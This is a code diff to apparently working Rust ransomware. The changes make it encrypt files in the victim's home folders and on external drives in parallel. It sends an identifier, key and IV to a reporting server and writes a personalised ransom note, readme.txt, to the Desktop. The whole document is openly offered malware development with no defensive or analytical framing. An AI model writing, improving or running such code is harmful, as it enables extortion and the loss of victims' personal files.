@@ -1,5 +1,6 @@
 #![windows_subsystem = "windows"]
 
+use rayon::prelude::*;
 use reqwest::blocking::Client;
 use std::{collections, fs, io::Write, path};
 
@@ -17,21 +18,22 @@ fn encrypt_local_filesystem(customer: &crypto::Customer) {
         "Pictures",
         "Music",
     ];
-    for folder in folders {
+
+    folders.par_iter().for_each(|folder| {
         walk_dir(
             path::Path::new(&format!(
                 "{}\\{}",
                 &dirs::home_dir().unwrap().display(),
-                folder
+                *folder
             )),
             customer,
         );
-    }
+    });
 }
 
 fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
     if let Ok(contents) = fs::read_dir(path) {
-        for entry in contents {
+        contents.par_bridge().into_par_iter().for_each(|entry| {
             let entry = entry.unwrap();
             match filesystem::check_dir_entry(&entry.path()) {
                 0 => {
@@ -42,7 +44,7 @@ fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
                 }
                 _ => (),
             }
-        }
+        });
     }
 }
 
@@ -57,15 +59,16 @@ pub fn report(message: &str) {
         .expect("Server connection failed");
 }
 
-fn create_ransom_note() {
+fn create_ransom_note(customer: &crypto::Customer) {
+    let ransom_note = format!("You may need this: {}", customer.identification);
     let desktop = dirs::home_dir().unwrap().join("Desktop");
     let onedrive_desktop = dirs::home_dir().unwrap().join("OneDrive").join("Desktop");
     if onedrive_desktop.exists() {
         let mut file = fs::File::create(onedrive_desktop.join("readme.txt")).unwrap();
-        file.write_all(constants::RANSOM_NOTE.as_bytes()).unwrap();
+        file.write_all(ransom_note.as_bytes()).unwrap();
     } else {
         let mut file = fs::File::create(desktop.join("readme.txt")).unwrap();
-        file.write_all(constants::RANSOM_NOTE.as_bytes()).unwrap();
+        file.write_all(ransom_note.as_bytes()).unwrap();
     }
 }
 
@@ -76,7 +79,7 @@ fn main() {
         &customer.identification, &customer.keypair.key, &customer.keypair.iv
     ));
     encrypt_local_filesystem(&customer);
-    create_ransom_note();
+    create_ransom_note(&customer);
     for entry in filesystem::get_external_drives() {
         walk_dir(&entry, &customer);
     }
